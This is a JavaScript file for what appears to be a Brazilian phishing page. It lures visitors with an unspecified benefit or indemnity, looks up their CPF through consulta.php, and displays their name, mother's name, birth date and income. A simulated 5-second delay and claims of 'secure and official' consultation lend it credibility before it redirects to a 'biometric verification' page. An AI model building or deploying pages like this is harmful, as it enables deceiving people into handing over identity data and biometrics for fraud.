// Remove máscara do CPF
function removeMask(value) {
  return value.replace(/\D/g, '');
}

// Validação simples de CPF
function isValidCPF(cpf) {
  return cpf.length === 11;
}

// Formata CPF
function formatCPF(cpf) {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}

// Formata moeda
function formatCurrency(valor) {
  return Number(valor).toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL'
  });
}

// Mostra tela de loading
function showLoadingScreen() {
  const conteudo = document.querySelector('.conteudo');
  conteudo.classList.add('loading-mode');
}

// Atualiza nome no header
function updateUserInfo(dadosUsuario) {
  const userName = document.getElementById('user-name');
  if (dadosUsuario && dadosUsuario.nome && userName) {
    const primeiroNome = dadosUsuario.nome.split(' ')[0];
    userName.textContent = primeiroNome || 'Usuário';
  }
}

// Restaura tela original
function restoreOriginalContent() {
  const userName = document.getElementById('user-name');
  if (userName) userName.textContent = 'Usuário';

  const conteudo = document.querySelector('.conteudo');
  const carousel = document.querySelector('.carousel');

  if (carousel) carousel.style.display = 'block';
  conteudo.classList.remove('loading-mode');

  conteudo.innerHTML = `
    <div class="conteudo-inner">
      <h2 class="titulo-section">Consulte seu benefício</h2>
      <p class="subtitulo">Descubra se você tem direito a receber uma indenização</p>
      <div class="container-form">
        <form id="cpfForm">
          <div class="input-label">
            Digite seu CPF para <span class="highlight">consultar</span> se você possui benefícios disponíveis
          </div>
          <div class="input-group">
            <label for="cpf">CPF</label>
            <input type="tel" id="cpf" name="cpf" placeholder="000.000.000-00" required="">
          </div>
          <p id="error-msg" class="error-message" style="display: none;"></p>
          <button type="submit" id="submit-btn">Consultar benefício</button>
        </form>
      </div>
      <div class="terms-section">
        <h2>Seus dados estão protegidos e seguros</h2>
      </div>
    </div>
  `;

  document.getElementById('cpf').addEventListener('input', () => {
    const input = document.getElementById('cpf');
    input.value = formatCPF(input.value);
  });

  document.getElementById('cpfForm').addEventListener('submit', handleFormSubmit);
}

// Exibe tela de confirmação
function showConfirmationScreen(dadosUsuario) {
  updateUserInfo(dadosUsuario);

  const conteudo = document.querySelector('.conteudo');
  const carousel = document.querySelector('.carousel');
  if (carousel) carousel.style.display = 'none';

  const nomeMae = dadosUsuario.nomeMae?.trim() !== ''
    ? dadosUsuario.nomeMae
    : 'Nome da mãe não informado';

  const dadosOriginais = JSON.parse(localStorage.getItem('dadosOriginais') || '{}');
  const rendaBruta = dadosOriginais.RENDA || 'Não informado';
  const renda = rendaBruta !== 'Não informado' ? formatCurrency(rendaBruta) : 'Não informado';
  const cpfFormatado = formatCPF(dadosUsuario.cpf);

  const sexoFormatado = dadosUsuario.sexo?.toUpperCase() === 'M' ? 'Masculino' :
                        dadosUsuario.sexo?.toUpperCase() === 'F' ? 'Feminino' :
                        'Não informado';

  conteudo.innerHTML = `
    <div class="card-content">
      <div class="form-header text-center">
        <h2>Confirme se você é essa pessoa</h2>
        <p>Verifique se os dados estão corretos antes de continuar.</p>
      </div>
      <div class="dados-container" id="dados-usuario">
        <div class="dado-item"><span class="dado-label">Nome completo</span><p class="dado-value">${dadosUsuario.nome}</p></div>
        <div class="dado-item"><span class="dado-label">Data de nascimento</span><p class="dado-value">${dadosUsuario.nascimento}</p></div>
        <div class="dado-item"><span class="dado-label">Nome da mãe</span><p class="dado-value">${nomeMae}</p></div>
        <div class="dado-item"><span class="dado-label">CPF</span><p class="dado-value">${cpfFormatado}</p></div>
        <div class="dado-item"><span class="dado-label">Sexo</span><p class="dado-value">${sexoFormatado}</p></div>
        <div class="dado-item"><span class="dado-label">Renda declarada</span><p class="dado-value">${renda}</p></div>
      </div>
      <div class="button-group">
        <button id="confirmar-btn" class="btn-primary">Sim, sou eu</button>
        <button id="corrigir-btn" class="btn-secondary">Não sou eu, corrigir dados</button>
      </div>
      <div class="security-info">
        <i class="fas fa-shield-alt"></i>
        <span>Dados consultados de forma segura e oficial</span>
      </div>
    </div>
  `;

  document.getElementById('confirmar-btn').addEventListener('click', () => {
    window.location.href = "verificacao-biometrica.html";
  });

  document.getElementById('corrigir-btn').addEventListener('click', restoreOriginalContent);
}

async function consultarCPF(cpf) {
  const response = await fetch(`consulta.php?cpf=${cpf}`);
  if (!response.ok) throw new Error("Erro na API");
  const resposta = await response.json();
  if (!resposta || !resposta.nome) throw new Error("CPF não encontrado");
  return resposta;
}

async function handleFormSubmit(e) {
  e.preventDefault();

  const cpfInput = document.getElementById('cpf');
  const currentErrorMsg = document.getElementById('error-msg');
  const cpf = removeMask(cpfInput.value);

  currentErrorMsg.style.display = 'none';
  currentErrorMsg.textContent = '';

  if (!isValidCPF(cpf)) {
    currentErrorMsg.textContent = 'CPF inválido. Verifique e tente novamente.';
    currentErrorMsg.style.display = 'block';
    return;
  }

  showLoadingScreen();

  try {
    const dadosUsuario = await consultarCPF(cpf);
    localStorage.setItem('dadosOriginais', JSON.stringify(dadosUsuario));

    // Simula carregamento com delay
    setTimeout(() => {
      showConfirmationScreen(dadosUsuario);
    }, 5000);

  } catch (err) {
    restoreOriginalContent();
    currentErrorMsg.textContent = 'Não foi possível consultar seus dados. Tente novamente.';
    currentErrorMsg.style.display = 'block';
  }
}

// Inicializa form ao carregar página
document.addEventListener("DOMContentLoaded", () => {
  const cpfForm = document.getElementById('cpfForm');
  if (cpfForm) {
    cpfForm.addEventListener('submit', handleFormSubmit);
  }
});